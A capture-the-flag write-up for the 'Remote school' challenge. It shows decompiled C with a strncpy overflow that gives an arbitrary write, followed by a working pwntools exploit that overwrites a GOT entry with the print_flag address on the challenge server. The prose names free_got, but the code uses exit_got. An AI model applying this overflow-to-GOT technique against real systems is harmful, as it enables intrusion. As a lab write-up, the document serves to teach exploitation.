# Remote school
> LongChampion, 06/04/2020

## Challenge
This challenge have many functions, with complex structures and flow. But to solve this, you only need to make attention for `class_hacker` and `test` function:  
`class_hacker`:
```cpp
int class_hacker()
{
  char s; // [esp+0h] [ebp-2008h]

  puts("\nWelcome!");
  fgets(&s, 0x2000, stdin);
  printf("Got %s\n", &s);
  return test(&s);
}
```
`test`:
```cpp
int __cdecl test(char *src)
{
  char dest[2048]; // [esp+8h] [ebp-810h]
  int XXXX; // [esp+808h] [ebp-10h]
  _DWORD *p; // [esp+80Ch] [ebp-Ch]
  int _EBP; // [esp+818h] [ebp+0h]

  printf("0x%x\n", &_EBP);
  strncpy(dest, src, 0x808u);                   // can overwrite XXXX and p
  *p = XXXX;                                    // write XXXX to somewhere
  return printf("0x%x\n", XXXX);
}
```
At `test` function, as commented, you can overwrite `XXXX` and `p`, it give you an arbitrary write. The binary is compiled with PIE, but ASLR is turned off in the server. So we can overwrite address of `print_flag` function to somewhere in GOT segment and take the flag. In the solution below, I choose `free_got` to overwrite.

## Solution
```python
#!/usr/bin/env python2
from pwn import *
context.binary = "./online"

r = remote("challenges.auctf.com", 30013)
r.sendlineafter("Name:", "LongChampion")
r.sendlineafter("menu]:", "attend Hacker")

print_flag_addr = 0x56556299
exit_got = 0x5655902c

payload = 'A' * 0x800 + p32(print_flag_addr) + p32(exit_got)
r.sendlineafter("Welcome!", payload)
r.sendlineafter("menu]:", "quit")
r.interactive()
```

Note that, you need trigger `exit` by send `quit` command to the binary. This will cause an infinity loop because `print_flag` will call `exit` (which is now `print_flag`) again and the binary will crash. But we get the flag so who care about this!
